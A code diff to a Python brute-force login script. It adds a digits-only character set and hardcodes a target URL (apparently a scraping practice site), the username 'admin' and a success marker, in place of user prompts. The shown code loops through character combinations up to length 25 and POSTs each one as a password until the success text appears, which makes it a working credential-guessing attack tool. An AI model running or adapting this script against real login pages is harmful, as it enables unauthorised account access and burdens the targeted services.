@@ -28,6 +28,7 @@ def menu():
 [1] : Just Lowercase
 [2] : Lowercase And Uppercase
 [3] : Lowercase, Uppercase, And Numbers
+[4] : Just Numbers
 """)
 
     sel = input("> ")
@@ -39,25 +40,28 @@ def menu():
         clear()
         chars = string.ascii_lowercase + string.ascii_uppercase
 
-
     elif sel=="3":
         clear()
         chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
 
+    elif sel=="4":
+        clear()
+        chars = string.digits
+
 
     num = 25
-    url = input("Page URL : ")
-    username = input("Username : ")
-    html = input("Defining Text On Page : ")
+    url = 'http://testing-ground.scraping.pro/login?mode=login'
+    username = ("admin")
+    html = ('<h3 class="success">WELCOME :)</h3>')
 
     start = time.perf_counter()
     for i in range(num+1):
         for attempt in product(chars, repeat=i):
             pure = ''.join([str(elem) for elem in attempt])
+
             payload = {
-                'Username': 'Admin',
-                'Password': pure,
-                'Submit': 'Login'
+                'usr': username,
+                'pwd': pure
             }
 
             re = requests.post(url=url, data=payload)
